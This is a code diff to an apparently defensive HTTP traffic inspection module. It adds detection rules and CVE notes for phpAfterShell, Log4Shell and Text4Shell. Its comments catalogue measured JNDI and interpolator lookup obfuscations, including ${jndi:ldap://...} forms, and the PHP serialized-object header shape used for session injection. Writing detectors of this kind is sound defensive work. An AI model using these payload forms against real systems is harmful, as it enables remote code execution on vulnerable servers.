@@ -24,6 +24,8 @@ import argparse
 import ctypes
 import hashlib
 import json
+import base64
+import binascii
 import re
 import sys
 import time
@@ -178,11 +180,22 @@ FINDING_REGISTRY: Dict[str, FindingDef] = {
            "Multipart filename carries a NUL and an OGNL opener, which "
            "commons-fileupload echoes into an evaluated message (S2-046)",
            ["CVE-2017-5638"]),
+        _f("HTTP-089", "php_aftershell_object_record", "F", CRITICAL, EXACT,
+           "PHP serialized-object header delivered in a multipart parameter "
+           "PHP stores in the session (phpAfterShell)",
+           ["CVE-2026-126714"]),
         _f("HTTP-087", "exchange_proxyshell_logon_strip", "F", CRITICAL, EXACT,
            "Explicit-logon strip moves the request off the autodiscover "
            "handler it was routed by (ProxyShell / ProxyNotShell)",
            ["CVE-2021-34473", "CVE-2022-41040"]),
         # ---- Tier G: content-coding validation ---------------------------
+        _f("HTTP-091", "log4shell_jndi_lookup", "E", CRITICAL, EXACT,
+           "JNDI lookup delivered in a field Log4j interpolates (Log4Shell)",
+           ["CVE-2021-44228", "CVE-2021-45046"]),
+        _f("HTTP-092", "text4shell_interpolator_lookup", "E", CRITICAL, EXACT,
+           "script, url or dns lookup delivered in a field Commons Text "
+           "interpolates (Text4Shell)",
+           ["CVE-2022-42889"]),
         _f("HTTP-090", "brotli_block_switch_violation", "G", CRITICAL, EXACT,
            "Brotli-coded body contains a block switch for a category with "
            "one block type, which the decoder rejects as a format error",
@@ -493,6 +506,59 @@ CVE_CATALOG.update({
                 "matches the path by SEGMENT, so both the original and the "
                 "trailing-slash form are covered.",
     },
+    "CVE-2026-126714": {
+        # Scored 9.2 under CVSS 4.0 by PHP as CNA; NVD has published no score
+        # of its own. Vector recorded because the AT:P (attack requirements
+        # present) term is the race this rule cannot see.
+        "score": 9.2, "cvss_version": "4.0",
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/"
+                  "SC:N/SI:N/SA:N",
+        "kev": False, "alias": "phpAfterShell",
+        "fixed": "8.2.36, 8.3.37, 8.4.28, 8.5.13, 8.6.0",
+        "note": "PHP's file session handler rewrites a session file in "
+                "place, so an interrupted update can leave a mix of old and "
+                "new bytes. The unauthenticated way in is upload-progress "
+                "handling, which writes session state before the target "
+                "script runs. PHP 8.1 and older are end of life and get no "
+                "fix; the code dates to PHP 4.1.0. Verified in php-src: the "
+                "fixed releases also flip session.upload_progress.enabled "
+                "from \"1\" to \"0\", though it stays ZEND_INI_PERDIR and "
+                "can be re-enabled per directory.",
+    },
+    "CVE-2021-44228": {
+        "score": 10.0, "cvss_version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "kev": True, "kev_added": "2021-12-10", "alias": "Log4Shell",
+        "affects": "Log4j 2.0-beta9 through 2.14.1",
+        "note": "A JNDI lookup in any field Log4j interpolates. The "
+                "obfuscation is Log4j's own lookup grammar, which is why "
+                "this is walked rather than string-matched.",
+    },
+    "CVE-2021-45046": {
+        "score": 9.0, "cvss_version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "kev": True, "kev_added": "2021-12-10",
+        "alias": "Log4Shell incomplete fix (context lookups)",
+        "note": "The incomplete fix in 2.15.0. The attacker's carrier field "
+                "still holds the jndi lookup, so the same rule covers it.",
+    },
+    "CVE-2022-42889": {
+        # Not in KEV. The CISA KEV feed is unreachable from the build
+        # sandbox, so this is recorded from vendor databases rather than
+        # from the feed, and no kev_date is claimed.
+        "score": 9.8, "cvss_version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "kev": False, "alias": "Text4Shell",
+        "affects": "Apache Commons Text 1.5 through 1.9",
+        "fixed": "1.10.0",
+        "note": "StringSubstitutor.createInterpolator() resolves script, "
+                "url and dns lookups. 1.10.0 disables those three in the "
+                "default lookup set rather than removing the code. No "
+                "confirmed in-the-wild exploitation; public PoCs only, and "
+                "the 9.8 score is widely held to overstate real-world "
+                "exploitability, which depends on an application passing "
+                "attacker text to an interpolator.",
+    },
     "CVE-2025-53770": {
         "score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         "kev": True, "kev_added": "2025-07-20",
@@ -529,6 +595,12 @@ CVE_CATALOG.update({
 # self-test asserts this is disjoint from the detected set and that every
 # reason is substantive (ciscoguard DEFERRED_CVES pattern).
 DEFERRED_CVES: Dict[str, str] = {
+    "CVE-2021-45105": "Log4j recursion DoS. NVD scores it below this "
+                      "module's 6.5 bar. The lookup walker's budget handles "
+                      "the self-referential shape safely and emits a "
+                      "walker_budget_exceeded signal, but no finding.",
+    "CVE-2021-44832": "Log4j JDBC appender RCE. Needs control of the "
+                      "logging configuration, not of the wire.",
     "CVE-2026-47291": (
         "HTTP.sys TLS header-line record flood. Assigned to tlswatch on "
         "2026-10-31: it is port-agnostic http.sys over TLS, and the record "
@@ -555,12 +627,6 @@ DEFERRED_CVES: Dict[str, str] = {
         "attribution needed. And the CNA scores it 5.3, below the bar (Red "
         "Hat 6.5, NVD none). It was briefly mis-attributed to HTTP-004 as the "
         "chunk-size overflow; that bug is CVE-2026-42580."
-    ),
-    "CVE-2026-126714": (
-        "phpAfterShell. Every byte of the chain is valid HTTP and success "
-        "leaves its mark in on-disk session state, not on the wire. There is "
-        "no malformation to read, so there is nothing for a passive observer "
-        "to key on. Closed 2026-11-22."
     ),
     "CVE-2026-115560": (
         "PHP session-handler RCE vector. Two config preconditions must both "
@@ -1504,7 +1570,7 @@ ATTACK_DEDUP_WINDOW = 300.0
 ATTACK_CODES = frozenset({
     "HTTP-080", "HTTP-081", "HTTP-082", "HTTP-083",
     "HTTP-084", "HTTP-085", "HTTP-086", "HTTP-087", "HTTP-088",
-    "HTTP-090",
+    "HTTP-089", "HTTP-090", "HTTP-091", "HTTP-092",
 })
 
 _PCT_ESCAPE_RE = re.compile(rb"%([0-9A-Fa-f]{2})")
@@ -3578,6 +3644,829 @@ def check_sharepoint_toolshell(msg: ParsedMessage, body: bytes,
         True, cfg, stats)
 
 
+
+# ---------------------------------------------------------------------------
+# HTTP-089: phpAfterShell (CVE-2026-126714)
+# ---------------------------------------------------------------------------
+# PHP's file session handler rewrites an existing session file in place, so
+# an interrupted update can leave a mix of old and new bytes. The session
+# file is a concatenation of key|serialized-value records, so bytes that
+# realign as "key|O:8:\"stdClass\":0:{}" become an object on the next read.
+# Upload-progress handling is the unauthenticated way in: it writes session
+# state from a multipart request before the target script runs.
+#
+# This rule fires on the delivery, never on the torn write or on a
+# deserialization - neither is on the wire. What makes it zero-FP is that
+# the object header has to survive PHP's own parameter decoding verbatim and
+# satisfy PHP's own unserializer grammar, and both were measured against
+# real PHP rather than read off a spec.
+#
+# Every decoding rule below was measured on PHP 8.3.6 (php -S, upload
+# progress on, cleanup off, session file read back). The measurements that
+# matter, because each one is a route in or out of the rule:
+#
+#   accepted and stored verbatim
+#     - a quoted value with backslash-escaped quotes, after unescaping
+#     - a single-quoted value: ' is a quoting character too
+#     - an unquoted value, terminated by ';', space, tab or end of header
+#     - parameter names case-folded: FILENAME= works
+#     - the header name case-folded: CONTENT-DISPOSITION: works
+#     - an obs-folded Content-Disposition, joined
+#     - OWS after '=' and any amount of OWS after ';'
+#     - a ';' inside a quoted value
+#     - a full path: dir/sub\x|O:... is kept whole
+#     - an object header in a FILE part's field name, stored as field_name
+#   not stored, so not an attack that lands
+#     - OWS BEFORE '=' ("filename ="): PHP does not recognise the
+#       parameter, the part becomes a plain field, and plain fields
+#       contribute nothing
+#     - filename*= (RFC 2231) is ignored entirely
+#     - the name of a part with NO filename: never stored
+#     - a '|' in the progress token: the whole session write fails
+#   duplicates
+#     - LAST occurrence wins, for filename and for name alike
+#
+# And the storage precondition, measured symmetrically by reconfiguring the
+# server: a NON-FILE part, with a NON-EMPTY value, whose name equals the
+# server's configured session.upload_progress.name, must PRECEDE the file
+# part. A file part with that name does not arm it, an unrelated plain field
+# does not, an empty value does not, and after the file part does not.
+#
+# That gives two conditions of different strength, and they are kept apart
+# on purpose. The configured name is NOT on the wire, so gating on the
+# default literal would blind the rule on a server with a custom
+# session.upload_progress.name. But "some non-file part with a non-empty
+# value precedes the payload part" is necessary on EVERY configuration, so
+# gating on that cannot cause a false negative, and it is a real narrowing.
+PHP_PROGRESS_FIELD_DEFAULT = b"PHP_SESSION_UPLOAD_PROGRESS"
+# The serialized-value tokens of PHP's own format. Used by the corroborating
+# counter, never to alert.
+PHP_SCALAR_TOKENS = (
+    (b"s:", "string"), (b"i:", "int"), (b"d:", "float"),
+    (b"b:0;", "bool"), (b"b:1;", "bool"), (b"a:", "array"),
+    (b"N;", "null"), (b"E:", "enum"), (b"r:", "reference"),
+    (b"R:", "reference"),
+)
+_PHP_OBJ_OPEN = re.compile(rb'([OC]):(\+?)([0-9]{1,9}):"')
+# PHP's unserializer starts a class name with a letter, underscore or a
+# high byte; it is the first character that is constrained.
+_PHP_CLASS_FIRST = re.compile(rb'[A-Za-z_\x80-\xff]')
+
+
+def php_disposition_params(value: bytes) -> Tuple[Dict[bytes, bytes],
+                                                 Dict[str, Any]]:
+    """Decode Content-Disposition parameters the way PHP's RFC 1867 parser
+    does, which is NOT the way parse_content_type does.
+
+    Two measured divergences from the generic decoder, each one a route the
+    generic decoder would get wrong:
+
+      - duplicates: PHP takes the LAST occurrence, the generic decoder the
+        first. Taking the first would fire on a value PHP discards.
+      - OWS before '=': PHP does not recognise the parameter at all, while
+        the generic decoder accepts it. Accepting it would fire on a part
+        PHP never stores.
+
+    Returns the parameters plus meta recording what was rejected, so the
+    evidence can say why something is not storable instead of silently
+    dropping it.
+    """
+    out: Dict[bytes, bytes] = {}
+    meta: Dict[str, Any] = {"ows_before_eq": 0, "rfc2231_ignored": 0,
+                            "duplicates": 0}
+    if not value:
+        return out, meta
+    i = value.find(b";")
+    rest = value[i + 1:] if i >= 0 else b""
+    pos = 0
+    n = len(rest)
+    while pos < n:
+        while pos < n and rest[pos:pos + 1] in (b" ", b"\t"):
+            pos += 1
+        eq = rest.find(b"=", pos)
+        if eq < 0:
+            break
+        raw_name = rest[pos:eq]
+        name = raw_name.strip(b" \t").lower()
+        # OWS before '=' - PHP does not see this parameter at all
+        if raw_name != name and raw_name.rstrip(b" \t") != raw_name:
+            meta["ows_before_eq"] += 1
+            name = None
+        pos = eq + 1
+        while pos < n and rest[pos:pos + 1] in (b" ", b"\t"):
+            pos += 1            # OWS after '=' is accepted (measured)
+        quote = rest[pos:pos + 1]
+        if quote in (b'"', b"'"):
+            pos += 1
+            buf = bytearray()
+            while pos < n:
+                ch = rest[pos:pos + 1]
+                if ch == b"\\" and pos + 1 < n:
+                    buf += rest[pos + 1:pos + 2]
+                    pos += 2
+                    continue
+                if ch == quote:
+                    pos += 1
+                    break
+                buf += ch
+                pos += 1
+            val = bytes(buf)
+        else:
+            end = n
+            for sep in (b";", b" ", b"\t"):
+                k = rest.find(sep, pos)
+                if 0 <= k < end:
+                    end = k
+            val = rest[pos:end]
+            pos = end
+        if name:
+            if name.endswith(b"*"):
+                meta["rfc2231_ignored"] += 1    # PHP ignores filename*
+            else:
+                if name in out:
+                    meta["duplicates"] += 1
+                out[name] = val                 # LAST wins (measured)
+        semi = rest.find(b";", pos)
+        pos = n if semi < 0 else semi + 1
+    return out, meta
+
+
+def php_object_header(value: bytes) -> Optional[Dict[str, Any]]:
+    """Find a serialized-object header PHP's unserializer would parse.
+
+    Mirrors the unserializer rather than matching a string: O: or C:, an
+    optional '+', a decimal length, ':"', EXACTLY that many bytes of class
+    name whose first byte is a letter, underscore or high byte, then '":'.
+    The exact-length requirement is what rejects a truncated or
+    length-mismatched header such as O:12:"draft.
+
+    Measured on PHP 8.3.6: O:8:"stdClass":0:{} and C:11:"ArrayObject":...
+    are accepted; O:+8:, lowercase o:, O: 8: (a space) and a class name
+    containing '"; are rejected. The '+' spelling is still matched here and
+    reported with spelling_accepted=False, because the finding is that a
+    record was DELIVERED - whether this host's unserializer would take that
+    spelling is part of the deserialization step the rule explicitly does
+    not infer, and no legitimate filename carries it either way.
+    """
+    for m in _PHP_OBJ_OPEN.finditer(value):
+        kind, plus, digits = m.group(1), m.group(2), m.group(3)
+        declared = int(digits)
+        start = m.end()
+        cls = value[start:start + declared]
+        if len(cls) != declared:
+            continue                    # truncated: the length does not fit
+        if value[start + declared:start + declared + 2] != b'":':
+            continue                    # the length does not match the name
+        if not _PHP_CLASS_FIRST.match(cls[:1]):
+            continue
+        if b'";' in cls:
+            continue                    # PHP rejects this class name
+        return {
+            "kind": kind.decode("ascii"),
+            "class_name": cls.decode("latin-1")[:120],
+            "declared_length": declared,
+            "plus_length_form": bool(plus),
+            "spelling_accepted": not plus,
+            "offset": m.start(),
+        }
+    return None
+
+
+def php_scalar_record(value: bytes) -> Optional[str]:
+    """R2's shape: <name>| followed by a serialized scalar, array or ref.
+
+    Corroborating only, never a finding. A plain session variable can be
+    forged this way without an object, but the tokens are short enough that
+    a real upload corpus has to vouch for them first.
+    """
+    bar = value.find(b"|")
+    if bar <= 0:
+        return None
+    tail = value[bar + 1:]
+    for tok, label in PHP_SCALAR_TOKENS:
+        if tail.startswith(tok):
+            return label
+    return None
+
+
+def php_storage_armed(parts: Sequence[MultipartPart],
+                      upto: int) -> Dict[str, Any]:
+    """Could PHP store anything from a part at index `upto`?
+
+    Measured necessary condition, independent of the server's configured
+    session.upload_progress.name: a non-file part with a non-empty value
+    must precede it. Gating on a necessary condition cannot cause a false
+    negative, and it is what keeps a lone file part from alerting.
+    """
+    candidates = 0
+    default_named = False
+    for p in parts[:upto]:
+        if p.filename is not None:
+            continue                    # a file part does not arm it
+        if not p.content.strip(b"\r\n"):
+            continue                    # an empty value does not arm it
+        candidates += 1
+        if (p.name or b"").upper() == PHP_PROGRESS_FIELD_DEFAULT:
+            default_named = True
+    return {"armed": candidates > 0,
+            "preceding_field_parts": candidates,
+            "default_progress_field_precedes": default_named}
+
+
+def check_php_aftershell(msg: ParsedMessage,
+                         parts: Sequence[MultipartPart],
+                         cfg: WatchConfig = WATCH_DEFAULTS,
+                         stats: Optional[Dict[str, int]] = None
+                         ) -> List[Finding]:
+    """HTTP-089, plus R2's corroborating counter."""
+    findings: List[Finding] = []
+    for p in parts:
+        disp = None
+        for hname, hval in p.headers:
+            if hname == b"content-disposition":
+                disp = hval
+                break
+        if disp is None:
+            continue
+        params, pmeta = php_disposition_params(disp)
+        # Only these two parameters reach a stored string. A part with no
+        # recognised filename is a plain field, and PHP stores nothing of
+        # a plain field - measured, so `name` there is reported stored=False.
+        is_file = b"filename" in params
+        for pname in (b"filename", b"name"):
+            val = params.get(pname)
+            if not val:
+                continue
+            hit = php_object_header(val)
+            if hit is None:
+                if stats is not None and php_scalar_record(val):
+                    stats["php_scalar_record_shape"] = (
+                        stats.get("php_scalar_record_shape", 0) + 1)
+                continue
+            armed = php_storage_armed(parts, p.index)
+            stored = is_file and armed["armed"]
+            ev = dict(hit)
+            ev.update({
+                "attack": "phpAfterShell",
+                "param": pname.decode("ascii"),
+                "part_index": p.index,
+                "file_part": is_file,
+                "record_shape": b"|" in val[:hit["offset"]],
+                "stored": stored,
+                "value_length": len(val),
+                "value_digest": redact(val),
+                "session_cookie_present": any(
+                    n.lower() == b"phpsessid"
+                    for raw in msg.get_all(b"cookie")
+                    for n, _ in parse_cookie(raw)),
+                "rfc2231_ignored": pmeta["rfc2231_ignored"],
+                "duplicate_params": pmeta["duplicates"],
+                "ows_before_eq": pmeta["ows_before_eq"],
+            })
+            ev.update(armed)
+            ev["note"] = (
+                "A serialized-object header survives PHP's own RFC 1867 "
+                "parameter decoding verbatim and satisfies PHP's own "
+                "unserializer grammar, including the exact class-name "
+                "length. PHP's file session handler rewrites a session file "
+                "in place, so an interrupted update can realign these bytes "
+                "as a key|value record. This records the delivery only: "
+                "whether a torn write happened, and whether anything was "
+                "deserialized, is not on the wire and is not inferred. "
+                "stored reflects PHP's measured necessary conditions - a "
+                "recognised filename parameter, and a non-file part with a "
+                "non-empty value before it; the configured "
+                "session.upload_progress.name is not on the wire, so it is "
+                "reported rather than required. Fixed releases also default "
+                "session.upload_progress.enabled to off, which the wire "
+                "does not show either.")
+            if cfg.log_attack_payload:
+                ev["payload"] = val.decode("latin-1", "replace")[:512]
+            findings.append(make_finding("HTTP-089", ev))
+    return findings
+
+
+
+# ---------------------------------------------------------------------------
+# HTTP-091 / HTTP-092: the lookup-grammar walker
+# ---------------------------------------------------------------------------
+# Log4Shell and Text4Shell are both "a dangerous lookup reached the
+# library", and in both the obfuscation is the victim library's OWN
+# substitution grammar: ${${lower:j}ndi:...} is not a string to match, it is
+# an expression to evaluate. So this walks the grammar instead of matching
+# bytes, the same move as React2Shell's Flight decode and Spring4Shell's
+# property paths. No payload content is matched: not the JNDI target, not
+# the script body, not a fetched URL.
+#
+# Two named libraries, two profiles, one engine. This is not a general
+# payload-signature engine, and it runs on fixed carriers only (headers,
+# cookies, the request target and Basic credentials), never on bodies -
+# bodies are decoded in unbounded application-specific ways and are where
+# legitimate text quoting these strings lives.
+#
+# Every rule below was measured against the real engines with the dangerous
+# lookups replaced by recorders, so nothing resolved or executed:
+# Log4j 2.19.0 (real StrSubstitutor + Interpolator) and Commons Text 1.11.0
+# (real StringSubstitutor.createInterpolator()).
+#
+# On the oracle versions. Maven Central is unreachable from the build
+# sandbox, so the vulnerable 2.14.1 and 1.9 could not be run. Rather than
+# leave that as a caveat, the engines' own sources were diffed:
+#   - Commons Text: createInterpolator() is byte-identical between 1.9 and
+#     1.11.0, and enableSubstitutionInVariables is an uninitialised private
+#     boolean - false - in both. 1.10.0 disabled script, url and dns in the
+#     DEFAULT lookup set rather than changing the grammar, and the probe
+#     reinstates them as recorders. So 1.11.0 is a faithful grammar oracle.
+#   - Log4j: the only grammar-relevant change from 2.14.1 to 2.19.0 is the
+#     CVE-2021-45105 cycle fix - checkCyclicSubstitution (which threw)
+#     became isCyclicSubstitution (which returns a boolean and resolves to
+#     null), and priorVariables was extended into nested-name substitution.
+#     Both bite on CYCLIC input only. Every published obfuscation is
+#     acyclic, so the two versions agree on everything in scope, and
+#     CVE-2021-45105 is out of scope anyway.
+#
+# Measured to REACH a dangerous lookup (Log4j): the plain form; ${lower:j}
+# and ${upper:j} nested in the name; ${::-j} per character; ${env:UNSET:-j}
+# and ${sys:UNSET:-j}; ${date:'j'} and ${date:'J'}; ${JNDI: and ${jNdI:;
+# double nesting; a default holding a nested lookup; literal text plus
+# nesting; ${${lower:JNDI}:; a lookup inside a default; a nested lookup
+# inside the JNDI name; the dns scheme; embedded mid-string; and
+# ${jndi:ldap://h/a:-x}, where the default is stripped off the end.
+# Measured NOT to: $${jndi: (escaped); a space, tab or newline inside or
+# before the prefix; Turkish dotted I, dotless i, or fullwidth letters;
+# percent-encoded %24%7Bjndi; ${jndi:-fallback} (a default, not a lookup);
+# ${requestId}; and ${::-$}{jndi:...}, whose OUTPUT holds a literal
+# ${jndi:...} that Log4j never re-scans.
+#
+# Measured for Commons Text: plain ${script:...}, ${SCRIPT: and ${ScRiPt:,
+# a base64Decoder wrap, a urlDecoder wrap, two decoder layers,
+# ${url:UTF-8:...}, ${dns:address|...}, and embedded mid-string all reach a
+# lookup; a nested NAME (${${::-s}cript:) does not, because substitution in
+# variable names is off; nor does $${script:, a leading space,
+# ${env:UNSET:-${script:...}}, double URL-encoding, or ${url:-...}.
+#
+# The one model that explains every measurement: a resolved value - the
+# default included, when the default becomes the value - IS substituted
+# again, while text that merely ends up adjacent after substitution is NOT
+# re-scanned. Together with the two different variable-end rules that
+# accounts for ${env:UNSET:-${script:js:1}} being inert in Commons Text:
+# the variable ends at the FIRST brace, so the default is the unbalanced
+# "${script:js:1" and nothing completes.
+LOOKUP_OPEN = b"${"
+# A sentinel for a value the walker cannot know, such as an environment
+# variable or an unquoted date pattern. It carries a NUL so that it can
+# never be part of a dangerous prefix, which is the whole invariant: an
+# OPAQUE result must never be able to COMPLETE one. Neither library has a
+# substring function, so no amount of unknown text can be cut down into
+# "jndi" or "script" either.
+OPAQUE_MARK = b"\x00?\x00"
+LOG4J_DANGEROUS = {b"jndi": "jndi"}
+CTEXT_DANGEROUS = {b"script": "script", b"url": "url", b"dns": "dns"}
+# Budget caps. Hitting one emits walker_budget_exceeded and a counter,
+# never a silent pass - the lesson from ldapwatch's filter-depth cap.
+LOOKUP_MAX_DEPTH = 24
+LOOKUP_MAX_EXPANSIONS = 512
+LOOKUP_MAX_OUTPUT = 16384
+LOOKUP_MIN_INTEREST = LOOKUP_OPEN      # no '${', no walk, no cost
+
+
+@dataclass
+class LookupProfile:
+    name: str
+    dangerous: Dict[bytes, str]
+    nested_names: bool          # is substitution in variable names on?
+    evaluable: Tuple[bytes, ...]
+
+
+LOG4J_PROFILE = LookupProfile(
+    "log4j", LOG4J_DANGEROUS, True, (b"lower", b"upper", b"date"))
+CTEXT_PROFILE = LookupProfile(
+    "commons_text", CTEXT_DANGEROUS, False,
+    (b"base64decoder", b"urldecoder", b"base64encoder", b"urlencoder"))
+
+
+@dataclass
+class LookupWalk:
+    hits: List[Dict[str, Any]] = field(default_factory=list)
+    features: Set[str] = field(default_factory=set)
+    # The NAMES of other lookups seen in the carrier. Names only: they show
+    # what the attacker tried to read (env, sys, java, ctx), which is the
+    # exfiltration half of the published chains, and a name is not a value.
+    lookups_seen: Set[str] = field(default_factory=set)
+    decoder_chain: List[str] = field(default_factory=list)
+    expansions: int = 0
+    budget_exceeded: bool = False
+
+    def spend(self) -> bool:
+        self.expansions += 1
+        if self.expansions > LOOKUP_MAX_EXPANSIONS:
+            self.budget_exceeded = True
+            return False
+        return True
+
+
+def _ascii_lower(data: bytes) -> bytes:
+    """Lowercase ASCII only.
+
+    Java's Locale.ROOT folding was measured NOT to fold Turkish dotted I,
+    dotless i or fullwidth letters into ASCII, so folding them here would
+    invent hits the library never produces.
+    """
+    return bytes(c + 32 if 65 <= c <= 90 else c for c in data)
+
+
+def _var_end(text: bytes, start: int, prof: LookupProfile) -> int:
+    """Where the variable that opened at `start` ends.
+
+    Log4j honours nesting, so ${${lower:j}ndi:x} ends at the LAST brace.
+    Commons Text does not, because substitution in variable names is off,
+    so it ends at the FIRST. Both measured.
+    """
+    if not prof.nested_names:
+        return text.find(b"}", start)
+    depth = 1
+    i = start
+    n = len(text)
+    while i < n:
+        # $${ is an escaped literal, so its brace opens nothing. Missing
+        # this let a self-referential ${${::-${::-$${::-j}}}ndi:...} close
+        # one brace early and fabricate a jndi hit the engine never
+        # produces - caught by the differential run against real Log4j.
+        if text[i:i + 3] == b"$" + LOOKUP_OPEN:
+            i += 3
+            continue
+        if text[i:i + 2] == LOOKUP_OPEN:
+            depth += 1
+            i += 2
+            continue
+        if text[i:i + 1] == b"}":
+            depth -= 1
+            if depth == 0:
+                return i
+            i += 1
+            continue
+        i += 1
+    return -1
+
+
+def _evaluate(prefix: bytes, arg: bytes, prof: LookupProfile,
+              walk: LookupWalk) -> Optional[bytes]:
+    """Evaluate a deterministic lookup, or None when the result is OPAQUE."""
+    if prof.name == "log4j":
+        if prefix == b"lower":
+            return _ascii_lower(arg)
+        if prefix == b"upper":
+            return bytes(c - 32 if 97 <= c <= 122 else c for c in arg)
+        if prefix == b"date":
+            # Only a fully quoted pattern is a known literal. Any unquoted
+            # pattern letter makes the result depend on the clock, so it is
+            # OPAQUE - it must not be allowed to complete a prefix.
+            body = arg.strip()
+            if len(body) >= 2 and body[:1] == b"'" and body[-1:] == b"'":
+                inner = body[1:-1]
+                if b"'" not in inner:
+                    walk.features.add("date_quoted_literal")
+                    return inner
+            return None
+        return None
+    if prefix == b"base64decoder":
+        try:
+            walk.features.add("base64Decoder")
+            walk.decoder_chain.append("base64Decoder")
+            return base64.b64decode(arg + b"=" * (-len(arg) % 4),
+                                    validate=False)
+        except (ValueError, binascii.Error):
+            return None
+    if prefix == b"urldecoder":
+        walk.features.add("urlDecoder")
+        walk.decoder_chain.append("urlDecoder")
+        return urldecode(arg)
+    if prefix == b"base64encoder":
+        return base64.b64encode(arg)
+    if prefix == b"urlencoder":
+        return arg
+    return None
+
+
+def _expand(text: bytes, prof: LookupProfile, walk: LookupWalk,
+            depth: int) -> bytes:
+    """Substitute every ${...} in `text` once, left to right.
+
+    The output is never re-scanned, which is what both libraries were
+    measured to do and is why ${::-$}{jndi:...} is inert.
+    """
+    if depth > LOOKUP_MAX_DEPTH:
+        walk.budget_exceeded = True
+        return OPAQUE_MARK
+    out = bytearray()
+    i = 0
+    n = len(text)
+    while i < n:
+        if len(out) > LOOKUP_MAX_OUTPUT:
+            walk.budget_exceeded = True
+            break
+        # the escape: $${ is a literal ${ and is not a variable
+        if text[i:i + 3] == b"$" + LOOKUP_OPEN:
+            walk.features.add("escaped_dollar")
+            out += LOOKUP_OPEN
+            i += 3
+            continue
+        if text[i:i + 2] != LOOKUP_OPEN:
+            out += text[i:i + 1]
+            i += 1
+            continue
+        end = _var_end(text, i + 2, prof)
+        if end < 0:
+            out += text[i:]
+            break
+        inner = text[i + 2:end]
+        i = end + 1
+        if not walk.spend():
+            out += OPAQUE_MARK
+            continue
+        out += _resolve(inner, prof, walk, depth + 1)
+    return bytes(out)
+
+
+def _resolve(inner: bytes, prof: LookupProfile, walk: LookupWalk,
+             depth: int) -> bytes:
+    """Resolve one variable's contents to the bytes it contributes."""
+    # Whether the ARGUMENT carried nesting has to be read off the raw text:
+    # by the time the name has been resolved the nesting is gone, so
+    # checking afterwards reports False for ${jndi:ldap://h/${sys:x}} and
+    # loses the exfiltration half of the published chains.
+    _raw_colon = inner.find(b":")
+    raw_arg_nested = (_raw_colon >= 0
+                      and LOOKUP_OPEN in inner[_raw_colon + 1:])
+    if prof.nested_names and LOOKUP_OPEN in inner:
+        walk.features.add("nested_name")
+        inner = _expand(inner, prof, walk, depth)
+    # Split the name from its default value exactly as the engines do. This
+    # is one positional scan with two guards, both read from source after
+    # the differential run against the real engines disagreed with a
+    # simpler reading:
+    #
+    #   - the scan stops at the first '${' when substitution in variable
+    #     names is off, so Commons Text hands ${dns:${::-a}ddress|h} the
+    #     argument "${::-a" rather than splitting a default off it
+    #     (StringSubstitutor 1.11.0 line 1491, StrSubstitutor 2.19.0 1057);
+    #   - Log4j also honours a ':\-' escape, which unescapes to ':-' inside
+    #     the NAME instead of starting a default, and then looks for a real
+    #     ':-' after it. Commons Text has no such matcher in 1.9 or 1.11.0;
+    #     Log4j has it in BOTH 2.14.1 and 2.19.0, so it is part of the
+    #     vulnerable grammar and not a post-patch addition.
+    name = inner
+    default: Optional[bytes] = None
+    n_in = len(inner)
+    i = 0
+    while i < n_in:
+        if not prof.nested_names and inner[i:i + 2] == LOOKUP_OPEN:
+            break
+        if prof.nested_names and inner[i:i + 3] == b":\\-":
+            walk.features.add("escaped_value_delimiter")
+            head = inner[:i] + b":"
+            name = head + inner[i + 2:]
+            for j in range(i + 3, n_in):
+                if inner[j:j + 2] == b":-":
+                    name = head + inner[i + 3:j]
+                    default = inner[j + 2:]
+                    walk.features.add("default_value")
+                    break
+            break
+        if inner[i:i + 2] == b":-":
+            name, default = inner[:i], inner[i + 2:]
+            walk.features.add("default_value")
+            break
+        i += 1
+    colon = name.find(b":")
+    if colon < 0:
+        # No prefix separator at all, so this is a lookup in the default
+        # map, never jndi or script. ${jndi:-fallback} lands here, which is
+        # why it was measured inert.
+        return _expand(default, prof, walk, depth) if default is not None \
+            else OPAQUE_MARK
+    prefix_raw, arg = name[:colon], name[colon + 1:]
+    prefix = _ascii_lower(prefix_raw)
+    if prefix != prefix_raw:
+        walk.features.add("case_folded_prefix")
+    if prefix not in prof.dangerous and prefix:
+        walk.lookups_seen.add(prefix.decode("latin-1")[:32])
+    if prefix in prof.dangerous:
+        # The argument may itself hold nested lookups (measured:
+        # ${jndi:${lower:L}DAP://h/a} reaches jndi with lDAP://h/a), and it
+        # may be OPAQUE without suppressing the hit - the prefix is what
+        # makes this dangerous, not the target.
+        target = _expand(arg, prof, walk, depth) if LOOKUP_OPEN in arg else arg
+        walk.hits.append({
+            "lookup": prof.dangerous[prefix],
+            "target_opaque": OPAQUE_MARK in target,
+            "target": target.replace(OPAQUE_MARK, b"?")
+                            .decode("latin-1")[:200],
+            "nested_in_argument": raw_arg_nested or LOOKUP_OPEN in arg,
+        })
+        return OPAQUE_MARK
+    if prefix in prof.evaluable:
+        value = _evaluate(prefix, arg, prof, walk)
+        if value is not None:
+            # a resolved value IS substituted again (measured on both)
+            return _expand(value, prof, walk, depth) \
+                if LOOKUP_OPEN in value else value
+        return default if default is not None else OPAQUE_MARK
+    # Any other lookup: an unset variable falls back to its default, which
+    # is what the published obfuscation relies on. Otherwise OPAQUE.
+    if default is not None:
+        walk.features.add("unset_lookup_default")
+        return _expand(default, prof, walk, depth)
+    return OPAQUE_MARK
+
+
+def walk_lookups(carrier: bytes, prof: LookupProfile) -> LookupWalk:
+    """Walk one carrier string under one profile."""
+    walk = LookupWalk()
+    if LOOKUP_MIN_INTEREST not in carrier:
+        return walk                 # the cheap gate: no '${', no work
+    _expand(carrier, prof, walk, 0)
+    return walk
+
+
+
+# --- the carriers (fixed decoding only) -----------------------------------
+# Header values, cookies, the request target and Basic credentials. Their
+# decoding is fixed, and they are where mass exploitation sprayed. Bodies
+# are excluded on purpose: applications decode them in unbounded ways, and
+# they are where legitimate text quoting these strings lives.
+LOOKUP_CARRIER_CAP = 8192
+LOOKUP_MAX_CARRIERS = 256
+
+
+def lookup_carriers(msg: ParsedMessage) -> List[Tuple[str, bytes]]:
+    """Every fixed-decoding carrier of one request, labelled."""
